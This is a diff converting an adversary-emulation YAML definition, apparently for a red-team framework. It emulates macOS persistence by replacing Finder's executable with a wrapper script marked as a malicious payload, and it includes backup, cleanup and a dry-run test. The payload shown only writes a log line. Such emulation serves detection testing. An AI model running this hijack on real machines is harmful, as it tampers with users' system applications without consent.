@@ -1,69 +1,61 @@
+---
 api_version: 2.0
-uuid: 12345678-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+uuid: 2feca215-69dc-4397-8640-de7b44ff6355
 name: Inject into application bundle
-description: Injects malicious code into an application bundle for persistence
-mitre_attack_id: T1547.010
-mitre_attack_technique: Application Shimming
-mitre_attack_tactic: Persistence
-platforms:
-  - darwin
+authors:
+- TTPForge
+description: |
+  Injects malicious code into an application bundle for persistence
+mitre:
+  tactics:
+  - TA0003 Persistence
+  techniques:
+  - T1574 Hijack Execution Flow
 requirements:
   platforms:
-    - os: darwin
+  - os: darwin
 args:
-  app_name:
-    description: Name of the application to inject into
-    type: string
-    default: Finder
-  bundle_path:
-    description: Path to the application bundle
-    type: string
-    default: /Applications/Finder.app
-  injection_script:
-    description: Path to the injection script
-    type: string
-    default: /usr/local/bin/app_inject.sh
-  backup_dir:
-    description: Directory to backup original executable
-    type: string
-    default: /tmp/app_backups
+- name: app_name
+  description: Name of the application to inject into
+  type: string
+  default: Finder
+- name: bundle_path
+  description: Path to the application bundle
+  type: string
+  default: /Applications/Finder.app
+- name: injection_script
+  description: Path to the injection script
+  type: string
+  default: /usr/local/bin/app_inject.sh
+- name: backup_dir
+  description: Directory to backup original executable
+  type: string
+  default: /tmp/app_backups
 steps:
-  - name: create_backup_directory
-    type: shell_command
-    command: "mkdir -p {{ backup_dir }}"
-  
-  - name: backup_original_executable
-    type: shell_command
-    command: "cp {{ bundle_path }}/Contents/MacOS/{{ app_name }} {{ backup_dir }}/{{ app_name }}.original 2>/dev/null || true"
-  
-  - name: create_injection_script
-    type: create_file
-    path: "{{ injection_script }}"
-    contents: |
-      #!/bin/bash
-      # Malicious injection payload
-      echo "Application bundle injection active" >> /tmp/injection.log
-      
-      # Execute original application
-      exec "{{ backup_dir }}/{{ app_name }}.original" "$@"
-    permissions: "0755"
-  
-  - name: replace_executable
-    type: shell_command
-    command: "cp {{ injection_script }} {{ bundle_path }}/Contents/MacOS/{{ app_name }}"
+- name: create_backup_directory
+  inline: mkdir -p {{ .Args.backup_dir }}
+- name: backup_original_executable
+  inline: cp {{ .Args.bundle_path }}/Contents/MacOS/{{ .Args.app_name }} {{ .Args.backup_dir }}/{{ .Args.app_name }}.original
+    2>/dev/null || true
+- name: create_injection_script
+  create_file: '{{ .Args.injection_script }}'
+  contents: |
+    #!/bin/bash
+    # Malicious injection payload
+    echo "Application bundle injection active" >> /tmp/injection.log
 
-checks:
-  - type: file_exists
-    path: "{{ backup_dir }}/{{ app_name }}.original"
-  - type: file_exists
-    path: "{{ bundle_path }}/Contents/MacOS/{{ app_name }}"
-
-cleanup:
-  - type: shell_command
-    command: "cp {{ backup_dir }}/{{ app_name }}.original {{ bundle_path }}/Contents/MacOS/{{ app_name }} 2>/dev/null || true"
-  - type: remove_file
-    path: "{{ injection_script }}"
-  - type: shell_command
-    command: "rm -rf {{ backup_dir }}"
-  - type: remove_file
-    path: "/tmp/injection.log"
+    # Execute original application
+    exec "{{ .Args.backup_dir }}/{{ .Args.app_name }}.original" "$@"
+  mode: 493
+  cleanup: default
+- name: replace_executable
+  inline: cp {{ .Args.injection_script }} {{ .Args.bundle_path }}/Contents/MacOS/{{ .Args.app_name }}
+  cleanup:
+    inline: |-
+      cp {{ .Args.backup_dir }}/{{ .Args.app_name }}.original {{ .Args.bundle_path }}/Contents/MacOS/{{ .Args.app_name }} 2>/dev/null || true
+      rm -f "{{ .Args.injection_script }}"
+      rm -rf {{ .Args.backup_dir }}
+      rm -f "/tmp/injection.log"
+tests:
+- name: dry_run_test
+  dry_run: true
